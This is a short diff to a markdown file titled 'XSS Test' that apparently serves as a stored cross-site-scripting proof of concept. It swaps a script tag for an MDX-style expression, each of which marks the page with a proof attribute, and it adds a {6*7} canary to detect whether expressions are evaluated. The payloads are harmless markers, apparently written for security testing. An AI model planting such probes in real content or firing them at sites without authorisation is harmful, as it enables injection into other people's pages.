@@ -1,10 +1,12 @@
 ---
 title: "XSS Test"
-description: "stored xss poc"
+description: "stored xss poc expr"
 ---
 
 XSSPROBESTART
 
-<script>document.documentElement.setAttribute('data-xss-proof','FIRED-'+document.domain)</script>
+ExprResult: {globalThis.document?.documentElement?.setAttribute?.('data-xss-proof','EXPR-'+globalThis.location?.host) ?? 'okexpr'}
+
+MathCanary: {6*7}
 
 XSSPROBEEND
